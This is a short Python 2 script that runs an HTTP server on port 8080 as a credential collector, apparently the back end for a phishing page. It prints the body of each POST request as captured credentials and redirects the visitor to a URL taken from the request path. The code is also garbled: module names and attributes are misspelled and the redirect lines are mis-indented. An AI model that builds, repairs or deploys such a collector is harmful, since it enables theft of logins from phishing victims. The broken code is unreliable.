import SimpletHttpServer
import SocketServer
import urllib

class CredRequestHandler(SimpletHttpServer.SimpletHttpRequestHandler):
	
	def do_POST(self):
		content_length = int(slef.headeers['Content-Length'])
		creds = self.rfile.read(content_length).decode('utf-8')
		print creds

	site = self.path[1:]
	self.send_response(301)
	self.send_headers('Location', urllib.unquote(site))
	self.end_headers()


server = SocketServer.TCPServer(('0.0.0.0',8080), CredRequestHandler)
server.serve_forever()

